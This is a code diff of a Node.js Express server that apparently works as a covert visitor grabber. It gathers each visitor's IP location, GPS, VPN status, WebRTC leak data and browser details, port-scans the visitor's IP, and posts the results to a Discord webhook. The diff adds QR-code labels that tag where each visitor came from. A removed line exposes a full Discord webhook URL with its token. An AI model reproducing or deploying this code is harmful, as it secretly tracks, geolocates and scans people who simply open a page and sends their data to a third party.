@@ -1,3 +1,10 @@
+codes = {
+    1: "CES",
+    2: "Your moms house",
+    3: "Rocket Gods House"
+}
+
+
 const express = require('express');
 const net = require('net');
 const path = require('path'); // Import the 'path' module
@@ -5,7 +12,7 @@ const path = require('path'); // Import the 'path' module
 const app = express();
 app.use(express.json());
 const port = 3000;
-var webhook_url = "https://discord.com/api/webhooks/1136009407608660048/JMvzKHlFPuLjN5H7pmNOuSpPL4pmWEiHqTh1xFc6YVAZyoEis8JvyGPYbA-0C6Wf6ctP"
+var webhook_url = "WEBHOOK GOES HERE"
 
 // Set the view engine to EJS
 app.set('view engine', 'ejs');
@@ -13,9 +20,11 @@ app.set('view engine', 'ejs');
 // Serve static files from the 'public' directory
 app.use(express.static(path.join(__dirname, 'public')));
 
-app.get('/', (req, res) => {
-    res.render('index.ejs');
+app.get('/:param?', (req, res) => {
+    const paramValue = req.params.param || 'none'; // Set a default value if param is not provided
+    res.render('index.ejs', { param: paramValue });
 });
+
 
 app.post('/', (req, res) => {
     res.sendStatus(200);
@@ -29,6 +38,12 @@ app.post('/', (req, res) => {
     var gpsValue = req.body.gpsValue;
     var vpnMessage = req.body.vpnMessage;
     var webrtcResult = req.body.webrtcResult;
+    var qrCode = req.body.qrCode;
+
+    if(qrCode in codes){
+        qrCode = codes[qrCode]
+    }
+
 
     scanCommonPorts(location.ip)
         .then((openPorts) => {
@@ -133,6 +148,11 @@ app.post('/', (req, res) => {
                     {
                         "name": "Cookies Enabled",
                         "value": additionalDetails.cookiesEnabled,
+                        "inline": true
+                    },
+                    {
+                        "name": "Source",
+                        "value": qrCode,
                         "inline": true
                     }
                     
